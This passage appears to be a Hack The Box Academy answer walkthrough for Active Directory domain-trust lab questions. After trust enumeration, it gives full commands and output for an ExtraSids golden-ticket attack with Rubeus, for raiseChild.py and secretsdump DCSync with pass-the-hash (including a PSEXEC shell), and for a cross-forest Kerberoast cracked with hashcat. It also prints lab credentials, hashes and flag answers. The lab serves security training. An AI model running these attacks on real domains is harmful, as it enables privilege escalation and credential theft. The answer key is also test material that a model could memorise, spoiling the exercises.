Answer: `Pass@word`

# Domain Trusts Primer

## Question 1

### "What is the child domain of INLANEFREIGHT.LOCAL? (format: FQDN, i.e., DEV.ACME.LOCAL)"

After spawning the target machine, students first need to connect to it with `xfreerdp` using the credentials `htb-student:Academy_student_AD!`:

Code: shell

```shell
xfreerdp /v:STMIP /u:htb-student /p:Academy_student_AD!
```

```
┌─[us-academy-1]─[10.10.14.12]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ xfreerdp /v:10.129.149.107 /u:htb-student /p:Academy_student_AD!

<SNIP>

Certificate details for 10.129.149.107:3389 (RDP-Server):
	Common Name: ACADEMY-EA-MS01.INLANEFREIGHT.LOCAL
	Subject:     CN = ACADEMY-EA-MS01.INLANEFREIGHT.LOCAL
	Issuer:      CN = ACADEMY-EA-MS01.INLANEFREIGHT.LOCAL
	Thumbprint:  2e:a1:7e:ac:38:d1:b5:99:8b:30:0b:ca:1a:2a:dd:0d:f3:c0:f6:79:e4:98:89:b8:08:66:d8:7f:98:c0:f2:37
```

When prompted with the "Computer Access Policy" message, students need to click on "OK". Once they access the spawned target machine, students need to close `Server Manager`. Then, students need to run `PowerShell` as Administrator.

Subsequently, students need to navigate to the `C:\Tools\` directory and import `PowerView.ps1`:

Code: powershell

```powershell
cd C:\Tools\
Import-Module .\PowerView.ps1
```

```
PS C:\Windows\system32> cd C:\Tools\
PS C:\Tools> Import-Module .\PowerView.ps1
```

Students then need to run `Get-DomainTrustMapping`:

Code: powershell

```powershell
Get-DomainTrustMapping
```

```
PS C:\Tools> Get-DomainTrustMapping

SourceName      : INLANEFREIGHT.LOCAL
TargetName      : LOGISTICS.INLANEFREIGHT.LOCAL
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : WITHIN_FOREST
TrustDirection  : Bidirectional
WhenCreated     : 11/1/2021 6:20:22 PM
WhenChanged     : 3/29/2022 5:14:31 PM

SourceName      : INLANEFREIGHT.LOCAL
TargetName      : FREIGHTLOGISTICS.LOCAL
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : FOREST_TRANSITIVE
TrustDirection  : Bidirectional
WhenCreated     : 11/1/2021 8:07:09 PM
WhenChanged     : 3/29/2022 4:48:04 PM
```

Students need to check for `TrustAttributes` with the value `WITHIN_FOREST`, and it will be `LOGISTICS.INLANEFREIGHT.LOCAL`.

Answer: `LOGISTICS.INLANEFREIGHT.LOCAL`

# Domain Trusts Primer

## Question 2

### "What domain does the INLANEFREIGHT.LOCAL domain have a forest transitive trust with?"

Using the same `xfreerdp` connection established in the previous question, students need to run the same `Get-DomainTrustMapping` command:

Code: powershell

```powershell
Get-DomainTrustMapping
```

```
PS C:\Tools> Get-DomainTrustMapping

SourceName      : INLANEFREIGHT.LOCAL
TargetName      : LOGISTICS.INLANEFREIGHT.LOCAL
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : WITHIN_FOREST
TrustDirection  : Bidirectional
WhenCreated     : 11/1/2021 6:20:22 PM
WhenChanged     : 3/29/2022 5:14:31 PM

SourceName      : INLANEFREIGHT.LOCAL
TargetName      : FREIGHTLOGISTICS.LOCAL
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : FOREST_TRANSITIVE
TrustDirection  : Bidirectional
WhenCreated     : 11/1/2021 8:07:09 PM
WhenChanged     : 3/29/2022 4:48:04 PM
```

Students need to check for `TrustAttributes` with the value `FOREST_TRANSITIVE` and it will be `FREIGHTLOGISTICS.LOCAL`.

Answer: `FREIGHTLOGISTICS.LOCAL`

# Domain Trusts Primer

## Question 3

### "What direction is this trust?"

Using the same `xfreerdp` connection from question 1, students need to run the same `Get-DomainTrustMapping` command:

Students then need to run `Get-DomainTrustMapping`:

Code: shell

```shell
Get-DomainTrustMapping
```

```
PS C:\Tools> Get-DomainTrustMapping

SourceName      : INLANEFREIGHT.LOCAL
TargetName      : LOGISTICS.INLANEFREIGHT.LOCAL
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : WITHIN_FOREST
TrustDirection  : Bidirectional
WhenCreated     : 11/1/2021 6:20:22 PM
WhenChanged     : 3/29/2022 5:14:31 PM

SourceName      : INLANEFREIGHT.LOCAL
TargetName      : FREIGHTLOGISTICS.LOCAL
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : FOREST_TRANSITIVE
TrustDirection  : Bidirectional
WhenCreated     : 11/1/2021 8:07:09 PM
WhenChanged     : 3/29/2022 4:48:04 PM
```

From the output students will know that the direction of this trust (i.e., the second one) is `Bidirectional`.

Answer: `Bidirectional`

# Attacking Domain Trusts - Child -> Parent Trusts - from Windows

## Question 1

### "What is the SID of the child domain?"

After spawning the target machine, students first need to connect to it with `xfreerdp` using the credentials `htb-student_adm:HTB_@cademy_stdnt_admin!`:

Code: shell

```shell
xfreerdp /v:STMIP /u:htb-student_adm /p:HTB_@cademy_stdnt_admin!
```

```
┌─[us-academy-1]─[10.10.14.224]─[htb-ac-413848@htb-jxpt0svqqz]─[~]
└──╼ [★]$ xfreerdp /v:10.129.112.231 /u:htb-student_adm /p:HTB_@cademy_stdnt_admin!

[07:20:41:256] [3156:3157] [INFO][com.freerdp.crypto] - creating directory /home/htb-ac-413848/.config/freerdp
[07:20:41:256] [3156:3157] [INFO][com.freerdp.crypto] - creating directory [/home/htb-ac-413848/.config/freerdp/certs]
[07:20:41:256] [3156:3157] [INFO][com.freerdp.crypto] - created directory [/home/htb-ac-413848/.config/freerdp/server]
[07:20:41:403] [3156:3157] [WARN][com.freerdp.crypto] - Certificate verification failure 'self signed certificate (18)' at stack position 0
[07:20:41:403] [3156:3157] [WARN][com.freerdp.crypto] - CN = ACADEMY-EA-DC02.LOGISTICS.INLANEFREIGHT.LOCAL
[07:20:41:403] [3156:3157] [ERROR][com.freerdp.crypto] - @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
[07:20:41:403] [3156:3157] [ERROR][com.freerdp.crypto] - @           WARNING: CERTIFICATE NAME MISMATCH!           @
[07:20:41:403] [3156:3157] [ERROR][com.freerdp.crypto] - @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
[07:20:41:403] [3156:3157] [ERROR][com.freerdp.crypto] - The hostname used for this connection (10.129.112.231:3389) 
[07:20:41:403] [3156:3157] [ERROR][com.freerdp.crypto] - does not match the name given in the certificate:
[07:20:41:403] [3156:3157] [ERROR][com.freerdp.crypto] - Common Name (CN):
[07:20:41:403] [3156:3157] [ERROR][com.freerdp.crypto] - 	ACADEMY-EA-DC02.LOGISTICS.INLANEFREIGHT.LOCAL
[07:20:41:403] [3156:3157] [ERROR][com.freerdp.crypto] - A valid certificate for the wrong name should NOT be trusted!
Certificate details for 10.129.112.231:3389 (RDP-Server):
	Common Name: ACADEMY-EA-DC02.LOGISTICS.INLANEFREIGHT.LOCAL
	Subject:     CN = ACADEMY-EA-DC02.LOGISTICS.INLANEFREIGHT.LOCAL
	Issuer:      CN = ACADEMY-EA-DC02.LOGISTICS.INLANEFREIGHT.LOCAL
	Thumbprint:  17:cd:fd:b1:fe:df:ac:2e:2c:12:c5:c0:8e:70:f7:1a:eb:83:a8:c7:df:18:50:99:2b:37:c6:e2:8e:a4:df:93
The above X.509 certificate could not be verified, possibly because you do not have
the CA certificate in your certificate store, or the certificate has expired.
Please look at the OpenSSL documentation on how to add a private CA to the store.
Do you trust the above certificate? (Y/T/N) Y
<SNIP>
```

When prompted with the "Computer Access Policy" message, students need to click on "OK". Once they access the spawned target machine, students need to close `Server Manager`. Then, students need to run `PowerShell` as Administrator.

Subsequently, students need to navigate to the `C:\Tools\` directory and import `PowerView.ps1`:

Code: powershell

```powershell
Import-Module .\PowerView.ps1
```

```
PS C:\Tools> Import-Module .\PowerView.ps1
```

Students then need to run `Get-DomainSID` to find the `SID` `S-1-5-21-2806153819-209893948-922872689`:

Code: powershell

```powershell
Get-DomainSID
```

```
PS C:\Tools> Get-DomainSID

S-1-5-21-2806153819-209893948-922872689
```

Answer: `S-1-5-21-2806153819-209893948-922872689`

# Attacking Domain Trusts - Child -> Parent Trusts - from Windows

## Question 2

### "What is the SID of the Enterprise Admins group in the root domain?"

Using the same `xfreerdp` connection established in the the previous question, students need to use `Get-DomainObject` to get the `SID` of the Enterprise Admins group in the root domain:

Code: shell

```shell
Get-DomainObject -Identity "Enterprise Admins" -Domain INLANEFREIGHT.LOCAL | select samaccountname,objectsid
```

```
PS C:\Tools> Get-DomainObject -Identity "Enterprise Admins" -Domain INLANEFREIGHT.LOCAL | select samaccountname,objectsid

samaccountname    objectsid
--------------    ---------
Enterprise Admins S-1-5-21-3842939050-3880317879-2865463114-519
```

Answer: `S-1-5-21-3842939050-3880317879-2865463114-519`

# Attacking Domain Trusts - Child -> Parent Trusts - from Windows

## Question 3

### "Perform the ExtraSids attack to compromise the parent domain. Submit the contents of the flag.txt file located in the c:\\ExtraSids folder on the ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL domain controller in the parent domain."

Using the same `xfreerdp` connection established in question 1 of this section, students first need to use `Rubeus`:

Code: powershell

```powershell
.\Rubeus.exe golden /rc4:9d765b482771505cbe97411065964d5f /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689  /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /user:hacker /ptt
```

```
PS C:\Tools> .\Rubeus.exe golden /rc4:9d765b482771505cbe97411065964d5f /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689 /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /user:hacker /ptt

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.0.2

[*] Action: Build TGT

[*] Building PAC

[*] Domain         : LOGISTICS.INLANEFREIGHT.LOCAL (LOGISTICS)
[*] SID            : S-1-5-21-2806153819-209893948-922872689
[*] UserId         : 500
[*] Groups         : 520,512,513,519,518
[*] ExtraSIDs      : S-1-5-21-3842939050-3880317879-2865463114-519
[*] ServiceKey     : 9D765B482771505CBE97411065964D5F
[*] ServiceKeyType : KERB_CHECKSUM_HMAC_MD5
[*] KDCKey         : 9D765B482771505CBE97411065964D5F
[*] KDCKeyType     : KERB_CHECKSUM_HMAC_MD5
[*] Service        : krbtgt
[*] Target         : LOGISTICS.INLANEFREIGHT.LOCAL

[*] Generating EncTicketPart
[*] Signing PAC
[*] Encrypting EncTicketPart
[*] Generating Ticket
[*] Generated KERB-CRED
[*] Forged a TGT for 'hacker@LOGISTICS.INLANEFREIGHT.LOCAL'

[*] AuthTime       : 6/22/2022 1:39:51 AM
[*] StartTime      : 6/22/2022 1:39:51 AM
[*] EndTime        : 6/22/2022 11:39:51 AM
[*] RenewTill      : 6/29/2022 1:39:51 AM

[*] base64(ticket.kirbi):

      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

[+] Ticket successfully imported!
```

Students then need to print out the contents of the flag:

Code: powershell

```powershell
cat \\ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL\c$\ExtraSids\flag.txt
```

```
PS C:\Tools> cat \\ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL\c$\ExtraSids\flag.txt

f@ll1ng_l1k3_d0m1no3$
```

Answer: `f@ll1ng_l1k3_d0m1no3$`

# Attacking Domain Trusts - Child -> Parent Trusts - from Linux

## Question 1

### "Perform the ExtraSids attack to compromise the parent domain from the Linux attack host. After compromising the parent domain obtain the NTLM hash for the Domain Admin user bross. Submit this hash as your answer."

After spawning the target machine, students first need to connect to it with `SSH` using the credentials `htb-student:HTB_@cademy_stdnt!`:

Code: shell

```shell
ssh htb-student@STMIP
```

```
┌─[us-academy-1]─[10.10.14.61]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ ssh htb-student@10.129.206.246

htb-student@10.129.206.246's password:

Linux ea-attack01 5.15.0-15parrot1-amd64 #1 SMP Debian 5.15.15-15parrot2 (2022-02-15) x86_64
 ____                      _     ____            
|  _ \ __ _ _ __ _ __ ___ | |_  / ___|  ___  ___ 
| |_) / _\` | '__| '__/ _ \| __| \___ \ / _ \/ __|
|  __/ (_| | |  | | | (_) | |_   ___) |  __/ (__ 
|_|   \__,_|_|  |_|  \___/ \__| |____/ \___|\___|

Last login: Sat Apr  9 18:29:27 2022 from 10.10.14.15

┌─[htb-student@ea-attack01]─[~]
└──╼ $
```

Students then need to use `raiseChild.py`, supplying it the credentials `htb-student_adm:HTB_@cademy_stdnt_admin!`:

Code: shell

```shell
raiseChild.py -target-exec 172.16.5.5 LOGISTICS.INLANEFREIGHT.LOCAL/htb-student_adm
```

```
┌─[htb-student@ea-attack01]─[~]
└──╼ $raiseChild.py -target-exec 172.16.5.5 LOGISTICS.INLANEFREIGHT.LOCAL/htb-student_adm

Impacket v0.9.24.dev1+20211013.152215.3fe2d73a - Copyright 2021 SecureAuth Corporation

Password:
[*] Raising child domain LOGISTICS.INLANEFREIGHT.LOCAL
[*] Forest FQDN is: INLANEFREIGHT.LOCAL
[*] Raising LOGISTICS.INLANEFREIGHT.LOCAL to INLANEFREIGHT.LOCAL
[*] INLANEFREIGHT.LOCAL Enterprise Admin SID is: S-1-5-21-3842939050-3880317879-2865463114-519
[*] Getting credentials for LOGISTICS.INLANEFREIGHT.LOCAL
LOGISTICS.INLANEFREIGHT.LOCAL/krbtgt:502:aad3b435b51404eeaad3b435b51404ee:9d765b482771505cbe97411065964d5f:::
LOGISTICS.INLANEFREIGHT.LOCAL/krbtgt:aes256-cts-hmac-sha1-96s:d9a2d6659c2a182bc93913bbfa90ecbead94d49dad64d23996724390cb833fb8
[*] Getting credentials for INLANEFREIGHT.LOCAL
INLANEFREIGHT.LOCAL/krbtgt:502:aad3b435b51404eeaad3b435b51404ee:16e26ba33e455a8c338142af8d89ffbc:::
INLANEFREIGHT.LOCAL/krbtgt:aes256-cts-hmac-sha1-96s:69e57bd7e7421c3cfdab757af255d6af07d41b80913281e0c528d31e58e31e6d
[*] Target User account name is administrator
INLANEFREIGHT.LOCAL/administrator:500:aad3b435b51404eeaad3b435b51404ee:88ad09182de639ccc6579eb0849751cf:::
INLANEFREIGHT.LOCAL/administrator:aes256-cts-hmac-sha1-96s:de0aa78a8b9d622d3495315709ac3cb826d97a318ff4fe597da72905015e27b6
[*] Opening PSEXEC shell at ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
[*] Requesting shares on ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL.....
[*] Found writable share ADMIN$
[*] Uploading file ujegaPyX.exe
[*] Opening SVCManager on ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL.....
[*] Creating service PFJg on ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL.....
[*] Starting service PFJg.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.107]
(c) 2018 Microsoft Corporation. All rights reserved.
```

Then, students need to use the administrator's NTLM hash to `DCsync` and `grep` for the `bross` user:

Code: shell

```shell
secretsdump.py inlanefreight.local/administrator@172.16.5.5 -hashes aad3b435b51404eeaad3b435b51404ee:88ad09182de639ccc6579eb0849751cf -just-dc | grep bross
```

```
┌─[htb-student@ea-attack01]─[~]
└──╼ $secretsdump.py inlanefreight.local/administrator@172.16.5.5 -hashes aad3b435b51404eeaad3b435b51404ee:88ad09182de639ccc6579eb0849751cf -just-dc | grep bross

inlanefreight.local\bross:1179:aad3b435b51404eeaad3b435b51404ee:49a074a39dd0651f647e765c2cc794c7:::
```

Answer: `49a074a39dd0651f647e765c2cc794c7`

# Attacking Domain Trusts - Cross-Forest Trust Abuse - from Windows

## Question 1

### "Perform a cross-forest Kerberoast attack and obtain the TGS for the mssqlsvc user. Crack the ticket and submit the account's cleartext password as your answer."

After spawning the target machine, students first need to connect to it with `xfreerdp` using the credentials `htb-student:Academy_student_AD!`:

Code: shell

```shell
xfreerdp /v:STMIP /u:htb-student /p:Academy_student_AD!
```

```
┌─[us-academy-1]─[10.10.14.12]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ xfreerdp /v:10.129.149.107 /u:htb-student /p:Academy_student_AD!

<SNIP>

Certificate details for 10.129.149.107:3389 (RDP-Server):
	Common Name: ACADEMY-EA-MS01.INLANEFREIGHT.LOCAL
	Subject:     CN = ACADEMY-EA-MS01.INLANEFREIGHT.LOCAL
	Issuer:      CN = ACADEMY-EA-MS01.INLANEFREIGHT.LOCAL
	Thumbprint:  2e:a1:7e:ac:38:d1:b5:99:8b:30:0b:ca:1a:2a:dd:0d:f3:c0:f6:79:e4:98:89:b8:08:66:d8:7f:98:c0:f2:37
```

When prompted with the "Computer Access Policy" message, students need to click on "OK". Once they access the spawned target machine, students need to close `Server Manager`. Then, students need to run `PowerShell` as Administrator.

Subsequently, students need to navigate to the `C:\Tools\` directory:

Code: powershell

```powershell
cd C:\Tools\
```

```
PS C:\Windows\system32> cd C:\Tools\
```

Students then need to run `Rubeus` to perform a cross-forest `Kerberoast` attack:

Code: powershell

```powershell
.\Rubeus.exe kerberoast /domain:freightlogistics.local /user:mssqlsvc /nowrap
```

```
PS C:\Tools> .\Rubeus.exe kerberoast /domain:freightlogistics.local /user:mssqlsvc /nowrap

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.0.2

[*] Action: Kerberoasting

[*] NOTICE: AES hashes will be returned for AES-enabled accounts.
[*]         Use /ticket:X or /tgtdeleg to force RC4_HMAC for these accounts.

[*] Target User            : mssqlsvc
[*] Target Domain          : freightlogistics.local
[*] Searching path 'LDAP://ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL/DC=freightlogistics,DC=local' for '(&(samAccountType=805306368)(servicePrincipalName=*)(samAccountName=mssqlsvc)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))'

[*] Total kerberoastable users : 1

[*] SamAccountName         : mssqlsvc
[*] DistinguishedName      : CN=mssqlsvc,CN=Users,DC=FREIGHTLOGISTICS,DC=LOCAL
[*] ServicePrincipalName   : MSSQLsvc/sql01.freightlogstics:1433
[*] PwdLastSet             : 3/24/2022 12:47:52 PM
[*] Supported ETypes       : RC4_HMAC_DEFAULT
[*] Hash                   : $krb5tgs$23$*mssqlsvc$FREIGHTLOGISTICS.LOCAL$MSSQLsvc/sql01.freightlogstics:1433@freightlogistics.local*$E8AF5DDF8DBDD8279A238646A42456E9$7070F10702296DF7F2DC6DB020A655E97BEB4814EA6BF4BC0F498F3673703FB6CF8F675B21DEFB7B41A35909FF357A093CB58598CAFEFC29C53C4B84D1206E98D11A46CDAB3969A0EF63F2AB98EBB893495D8D9651C7F8D6B63FA6B572453870A40D8627C4EC3D63FF79C3F892D763D9A2EB0F8BA6B9C36EDB0360C035442FDF3B64760474C49F0D35EC0B6056695618BB53121A3829549EFCC87D49A2D168500E9978DA431C2EDE1A2581A549D828A55E5B007AD526AC25C80F5950C9B3D7EAB1EF8A95B805E172B0073FF9A7AC34E274C11E032639E1C690CE948471FAFAA26E241CF414A68B28DA0040AB3CEA289D43D2C34B27D99B4217A39C44ADD92FE832FDA459FCACBF1626D0FA6E461835959037AC6F96DA0AC5DDD2AD6E5D1EE8EBC592605337EDD15D2FC372C41D6CDA854393A3E617BF0C172EDB6581292B50D6757886978911C38D4E4325F48E5129296D1890F363E5A2E33D61258CBAA56690393EE41F85677F00DAC14B00A80FEC3FFD3B3DE2416B330F6EF52D673CFA325428E1E4D5388D5A7EFEAA4EE3B3D45643389F0E4C744E4C5615F2845C9C7B8148F798DCD7C9A5A24472430DE69A268AA5153023E35276B659F9C545CE336357823537858BEB9D9B776AEA7B7DB17A3BD8E665AFCB32EFFE6CEFEF09F6742CA7407B251B7BA28895599D08916762A09ADFF22EA1BF9E286A338007F10D1FCC0604DABB9D9D1B3D5447440A2CE2B68262C4950537B35EF577C0ACF7AE957709D7DC055F136C96F92F5126DC3CAF4E5D361B03283C4DBC441D7D126DF863186417E6D1F1119DA667EAB7A725C2457B81D0BF61B31CF7E5A00E11CE22BDEB9F6F4C2502DCCEF36DDC026CC85DACC8AA2BE6EC27DD515EA910998208E168D99B08115591CBADC407C08E41C0D525ACCEF8AE42DFAD2799E5FD40BFD830CA7C58158FDC56B60A4EE133E4C141F108C3A1FE25A147E660298BF0A9F15E0D5B21E2B0DE22D36166CEB32C5EDA8D7DAFAF4B58264C347F190E0E56A2AF8259527F1234F77073FC444D36FED5D1B3C428273F0E0BB87AA747D74B3A4E83A0BD6353EA4435AD016C47BD5D04DB86C264F4F320820653062A34D0BA343B053EB4D5E4CC7017AC3AB54CB9B3E876E48A2D3F42B20779A716729D915ACB94C1C29704F5CA3598F83EDA5B1A23D040BC61FD201494F09F14EF8D7FB7C71F314E6BC72FB98A13391A2D5B746B621812347FEC81E860F8259B07AEF566F321C962AFA275A0C25F263DDD9B6D8B4459A981CFD766F79BA7EC0D5245D1302D5DB1CE2F59053ACE49A8999ACD67845C0E9DB0C100808381E0C967B71976DB1D3A36FA28DBEC120C6E2D31073859FCD849CCB6BFE84C563E3CBA049329818D8DBEE04A22CC455EEF0BB691E358E12AD5CE01590A0FB00669A291F69228C00966A4F0E37A6BDD112195A6C25BF74EF4FF97BD527D2C6326A36B172DF0373FE11CA35AA9E64EA5068AB6CD0EB0958F82AA1C4BDF732FAAADEB4656E22DC2BD9953C0A3B16F10D1E888F37C167A8DEE9DD2621E1D370FBDC9650B1B58A0B903D9F931A59239D9029EE291A727DB012A60DAB1009C32F1C921209ABF28ADCCDBB834E7EF7C9A36B037950D1DE29A2C6FBFA8388417433F36A877B54B0A45C4DC495D9BF4E0C8
```

Thereafter, students need to save the hash into a file in `Pwnbox`/`PMVPN` and then use `Hashcat` to crack it, utilizing hashmode 13100; students will find out that the plaintext password of the cracked hash is `1logistics`:

Code: shell

```shell
hashcat -m 13100 -w 3 -O hash.txt /usr/share/wordlists/rockyou.txt
```

```
┌─[us-academy-1]─[10.10.14.135]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ hashcat -m 13100 -w 3 -O hash.txt /usr/share/wordlists/rockyou.txt 
hashcat (v6.1.1) starting...

<SNIP>

$krb5tgs$23$*mssqlsvc$FREIGHTLOGISTICS.LOCAL$MSSQLsvc/sql01.freightlogstics:1433@freightlogistics.local*$e8af5ddf8dbdd8279a238646a42456e9$7070f10702296df7f2dc6db020a655e97beb4814ea6bf4bc0f498f3673703fb6cf8f675b21defb7b41a35909ff357a093cb58598cafefc29c53c4b84d1206e98d11a46cdab3969a0ef63f2ab98ebb893495d8d9651c7f8d6b63fa6b572453870a40d8627c4ec3d63ff79c3f892d763d9a2eb0f8ba6b9c36edb0360c035442fdf3b64760474c49f0d35ec0b6056695618bb53121a3829549efcc87d49a2d168500e9978da431c2ede1a2581a549d828a55e5b007ad526ac25c80f5950c9b3d7eab1ef8a95b805e172b0073ff9a7ac34e274c11e032639e1c690ce948471fafaa26e241cf414a68b28da0040ab3cea289d43d2c34b27d99b4217a39c44add92fe832fda459fcacbf1626d0fa6e461835959037ac6f96da0ac5ddd2ad6e5d1ee8ebc592605337edd15d2fc372c41d6cda854393a3e617bf0c172edb6581292b50d6757886978911c38d4e4325f48e5129296d1890f363e5a2e33d61258cbaa56690393ee41f85677f00dac14b00a80fec3ffd3b3de2416b330f6ef52d673cfa325428e1e4d5388d5a7efeaa4ee3b3d45643389f0e4c744e4c5615f2845c9c7b8148f798dcd7c9a5a24472430de69a268aa5153023e35276b659f9c545ce336357823537858beb9d9b776aea7b7db17a3bd8e665afcb32effe6cefef09f6742ca7407b251b7ba28895599d08916762a09adff22ea1bf9e286a338007f10d1fcc0604dabb9d9d1b3d5447440a2ce2b68262c4950537b35ef577c0acf7ae957709d7dc055f136c96f92f5126dc3caf4e5d361b03283c4dbc441d7d126df863186417e6d1f1119da667eab7a725c2457b81d0bf61b31cf7e5a00e11ce22bdeb9f6f4c2502dccef36ddc026cc85dacc8aa2be6ec27dd515ea910998208e168d99b08115591cbadc407c08e41c0d525accef8ae42dfad2799e5fd40bfd830ca7c58158fdc56b60a4ee133e4c141f108c3a1fe25a147e660298bf0a9f15e0d5b21e2b0de22d36166ceb32c5eda8d7dafaf4b58264c347f190e0e56a2af8259527f1234f77073fc444d36fed5d1b3c428273f0e0bb87aa747d74b3a4e83a0bd6353ea4435ad016c47bd5d04db86c264f4f320820653062a34d0ba343b053eb4d5e4cc7017ac3ab54cb9b3e876e48a2d3f42b20779a716729d915acb94c1c29704f5ca3598f83eda5b1a23d040bc61fd201494f09f14ef8d7fb7c71f314e6bc72fb98a13391a2d5b746b621812347fec81e860f8259b07aef566f321c962afa275a0c25f263ddd9b6d8b4459a981cfd766f79ba7ec0d5245d1302d5db1ce2f59053ace49a8999acd67845c0e9db0c100808381e0c967b71976db1d3a36fa28dbec120c6e2d31073859fcd849ccb6bfe84c563e3cba049329818d8dbee04a22cc455eef0bb691e358e12ad5ce01590a0fb00669a291f69228c00966a4f0e37a6bdd112195a6c25bf74ef4ff97bd527d2c6326a36b172df0373fe11ca35aa9e64ea5068ab6cd0eb0958f82aa1c4bdf732faaadeb4656e22dc2bd9953c0a3b16f10d1e888f37c167a8dee9dd2621e1d370fbdc9650b1b58a0b903d9f931a59239d9029ee291a727db012a60dab1009c32f1c921209abf28adccdbb834e7ef7c9a36b037950d1de29a2c6fbfa8388417433f36a877b54b0a45c4dc495d9bf4e0c8:1logistics

<SNIP>
```

Answer: `1logistics`

# Attacking Domain Trusts - Cross-Forest Trust Abuse - from Linux

## Question 1

